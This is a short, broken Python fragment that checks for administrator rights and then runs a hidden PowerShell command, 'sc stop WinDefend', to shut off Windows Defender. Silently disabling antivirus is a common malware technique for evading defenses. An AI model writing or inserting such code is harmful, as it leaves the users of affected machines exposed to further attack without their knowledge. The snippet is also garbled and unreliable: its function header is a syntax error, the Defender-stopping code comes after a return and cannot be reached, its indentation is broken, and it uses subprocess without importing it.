import ctypes, os
def go();
   try:
       is_admin = (os.getuid() == 0)
   except AttributeError:
       is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
   return is_admin
  if is_admin:
    si = subprocess.STARTUPINFO()
    si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
    subprocess.call("powershell -c sc stop WinDefend", startupinfo=si, shell=True)
